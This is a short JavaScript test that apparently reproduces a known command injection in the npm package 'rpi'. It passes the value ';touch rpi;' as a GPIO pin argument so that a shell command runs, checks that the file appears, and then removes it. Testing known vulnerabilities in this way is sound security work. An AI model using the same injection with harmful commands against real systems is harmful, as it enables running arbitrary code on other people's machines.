//https://snyk.io/vuln/SNYK-JS-RPI-548942
test("Command Injection in rpi", () => 
{
    const RPI = require("rpi");
    const fs = require('fs');
    const path = './rpi';
    const sleep = require('sleep');

    //checking that its not present already
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(false);

    let pin = new RPI.GPIO(';touch rpi;', '123');

    sleep.sleep(5);
    //checking that its created by after exploit.
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);

    fs.unlink(path, function(err) {});//deleting the file after creation
});
